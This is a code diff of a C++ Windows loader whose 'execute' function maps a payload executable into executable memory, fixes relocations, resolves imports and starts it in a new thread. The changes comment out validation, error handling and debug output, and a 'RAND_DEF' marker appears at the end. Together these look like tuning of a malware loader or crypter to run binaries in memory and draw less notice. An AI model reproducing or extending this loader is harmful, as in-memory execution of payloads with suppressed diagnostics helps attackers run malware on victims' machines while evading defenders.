@@ -47,6 +47,7 @@ void execute(const vector<unsigned char> &payload) {
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);
 
     // Validates DOS and NT Headers
+    /*
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         cerr << "DOS Invalid" << endl;
         if(DEBUG){cin.get();}
@@ -59,6 +60,7 @@ void execute(const vector<unsigned char> &payload) {
 
         return;
     }
+    */
 
     // Memory allocation for the executable image with execute permissions  
     void* execMemory = VirtualAlloc(
@@ -69,19 +71,21 @@ void execute(const vector<unsigned char> &payload) {
     );
 
     // Checks that the memory allocation was successful
+    /*
     if (!execMemory) {
         cerr << "VirtualAlloc failed with error code: " << GetLastError() << endl;
         if(DEBUG){cin.get();}
 
         return;
     }
-
+    
     // For debugging
     cout << "Memory allocation at: " << execMemory << endl;
+    */
 
     // Copy the payload headers into a section of the allocated memory
     memcpy(execMemory, payload.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
-    cout << "Headers copied" << endl;
+    //cout << "Headers copied" << endl;
 
     // Iterates over every section of the binary and copies them into a section of allocated memory
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
@@ -90,9 +94,9 @@ void execute(const vector<unsigned char> &payload) {
         void* sectionSrc = (void*)((BYTE*)payload.data() + section->PointerToRawData);
         memcpy(sectionDest, sectionSrc, section->SizeOfRawData);
 
-        cout << "Section " << section->Name << " copied to " << sectionDest << "\n";
+        //cout << "Section " << section->Name << " copied to " << sectionDest << "\n";
     }
-    if(DEBUG){cin.get();}
+    //if(DEBUG){cin.get();}
     // Process Relocations
     // PEs have a preferred base address, which will (likely) not match the base address returned from VirtualAlloc().
     // Need to make adjustments to the addresses of the sections relative to the new base address returned from
@@ -107,8 +111,10 @@ void execute(const vector<unsigned char> &payload) {
     if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
         PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)execMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
         while (relocation->VirtualAddress > 0) {
-            // Diff between base address of VirtualAlloc() and preferred base address 
+            // Diff between base address of VirtualAlloc() buffer and preferred base address 
             uintptr_t delta = (uintptr_t)((BYTE*)execMemory - ntHeaders->OptionalHeader.ImageBase);
+
+            // Number of relocation entries in block
             int count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
             PWORD relocEntry = (PWORD)((BYTE*)relocation + sizeof(IMAGE_BASE_RELOCATION));
             for (int i = 0; i < count; i++, relocEntry++) {
@@ -154,12 +160,16 @@ void execute(const vector<unsigned char> &payload) {
             // Loads the DLL specified in the import table entry, verifies that it was loaded 
             char* moduleName = (char*)((BYTE*)execMemory + importDescriptor->Name);
             HMODULE module = LoadLibraryA(moduleName);
+            
+            /*
             if (!module) {
                 cerr << "Failed to load module: " << moduleName << endl;
                 if(DEBUG){cin.get();}
                 
                 return;
             }
+            */
+
             PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)execMemory + importDescriptor->FirstThunk);
             while (thunk->u1.AddressOfData) {
                 // Function name from import table 
@@ -167,12 +177,16 @@ void execute(const vector<unsigned char> &payload) {
                 
                 // Function address
                 FARPROC func = GetProcAddress(module, import->Name);
+                
+                /*
                 if (!func) {
                     cerr << "Failed to get address of function: " << import->Name  << endl;
                     if(DEBUG){cin.get();}
 
                     return;
                 }
+                */
+
                 // Set the address in the import table 
                 thunk->u1.Function = (uintptr_t)func;
                 thunk++;
@@ -183,12 +197,20 @@ void execute(const vector<unsigned char> &payload) {
 
     // Get the address of the entry point
     void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    cout << "Image entry point: " << entryPoint << "\n";
-    if(DEBUG){cin.get();}
+
+
+    /*
+    if(DEBUG){
+        cout << "Image entry point: " << entryPoint << "\n";
+        cin.get();
+    }
+    */
+
 
     // Create a new thread that starts execution at the entry point
     HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
 
+    /*
     if (!thread) {
         cerr << "CreateThread failed with error code: " << GetLastError()  << endl;
         VirtualFree(execMemory, 0, MEM_RELEASE);
@@ -196,9 +218,10 @@ void execute(const vector<unsigned char> &payload) {
 
         return;
     }
-
+    
     cout << "Thread created, waiting...\n";
     if(DEBUG){cin.get();}
+    */
 
     // Wait for the thread to finish
     WaitForSingleObject(thread, INFINITE);
@@ -207,8 +230,10 @@ void execute(const vector<unsigned char> &payload) {
     CloseHandle(thread);
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
-    cout << "Thread execution finished\n";
-    if(DEBUG){cin.get();}
+
+    //cout << "Thread execution finished\n";
+    //if(DEBUG){cin.get();}
+    
 }
 
 /*RAND_DEF*/
